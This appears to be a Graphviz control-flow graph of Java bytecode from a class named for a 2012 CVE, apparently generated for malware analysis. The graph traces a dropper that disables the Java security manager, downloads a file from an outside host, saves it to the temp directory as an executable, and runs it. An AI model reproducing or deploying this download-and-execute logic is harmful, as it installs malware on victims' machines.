digraph "" {
    "r0 := @this: cve2012xxxx.Gondvv"
    "load.r r0"
    "r0 := @this: cve2012xxxx.Gondvv"->"load.r r0";
    "virtualinvoke <cve2012xxxx.Gondvv: void disableSecurity()>"
    "load.r r0"->"virtualinvoke <cve2012xxxx.Gondvv: void disableSecurity()>";
    "new java.net.URL"
    "virtualinvoke <cve2012xxxx.Gondvv: void disableSecurity()>"->"new java.net.URL";
    "dup1.r"
    "new java.net.URL"->"dup1.r";
    "push \"http://imextools.co.cc/g.jar\""
    "dup1.r"->"push \"http://imextools.co.cc/g.jar\"";
    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
    "push \"http://imextools.co.cc/g.jar\""->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
    "virtualinvoke <java.net.URL: java.io.InputStream openStream()>"
    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.io.InputStream openStream()>";
    "staticinvoke <java.nio.channels.Channels: java.nio.channels.ReadableByteChannel newChannel(java.io.InputStream)>"
    "virtualinvoke <java.net.URL: java.io.InputStream openStream()>"->"staticinvoke <java.nio.channels.Channels: java.nio.channels.ReadableByteChannel newChannel(java.io.InputStream)>";
    "store.r r0"
    "staticinvoke <java.nio.channels.Channels: java.nio.channels.ReadableByteChannel newChannel(java.io.InputStream)>"->"store.r r0";
    "new java.io.FileOutputStream"
    "store.r r0"->"new java.io.FileOutputStream";
    "store.r $r5"
    "new java.io.FileOutputStream"->"store.r $r5";
    "load.r $r5"
    "store.r $r5"->"load.r $r5";
    "new java.lang.StringBuilder"
    "load.r $r5"->"new java.lang.StringBuilder";
    "new java.lang.StringBuilder"->"dup1.r";
    "push \"java.io.tmpdir\""
    "dup1.r"->"push \"java.io.tmpdir\"";
    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
    "push \"java.io.tmpdir\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"
    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
    "push \"dlname.exe\""
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"push \"dlname.exe\"";
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
    "push \"dlname.exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"load.r $r5";
    "virtualinvoke <java.io.FileOutputStream: java.nio.channels.FileChannel getChannel()>"
    "load.r $r5"->"virtualinvoke <java.io.FileOutputStream: java.nio.channels.FileChannel getChannel()>";
    "virtualinvoke <java.io.FileOutputStream: java.nio.channels.FileChannel getChannel()>"->"load.r r0";
    "push 0L"
    "load.r r0"->"push 0L";
    "push 16777216L"
    "push 0L"->"push 16777216L";
    "virtualinvoke <java.nio.channels.FileChannel: long transferFrom(java.nio.channels.ReadableByteChannel,long,long)>"
    "push 16777216L"->"virtualinvoke <java.nio.channels.FileChannel: long transferFrom(java.nio.channels.ReadableByteChannel,long,long)>";
    "pop"
    "virtualinvoke <java.nio.channels.FileChannel: long transferFrom(java.nio.channels.ReadableByteChannel,long,long)>"->"pop";
    "pop"->"load.r $r5";
    "virtualinvoke <java.io.FileOutputStream: void close()>"
    "load.r $r5"->"virtualinvoke <java.io.FileOutputStream: void close()>";
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
    "virtualinvoke <java.io.FileOutputStream: void close()>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
    "new java.lang.StringBuilder"->"dup1.r";
    "dup1.r"->"push \"java.io.tmpdir\"";
    "push \"java.io.tmpdir\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"push \"dlname.exe\"";
    "push \"dlname.exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"store.r r0";
    "store.r r0"->"load.r r0";
    "ifnull load.r r0"
    "load.r r0"->"ifnull load.r r0";
    "ifnull load.r r0"->"load.r r0";
    "virtualinvoke <java.lang.Process: int waitFor()>"
    "load.r r0"->"virtualinvoke <java.lang.Process: int waitFor()>";
    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
    "goto return"
    "pop"->"goto return";
    "return"
    "goto return"->"return";
    "virtualinvoke <java.lang.Throwable: void printStackTrace()>"
    "virtualinvoke <java.lang.Process: int waitFor()>"->"virtualinvoke <java.lang.Throwable: void printStackTrace()>";
}
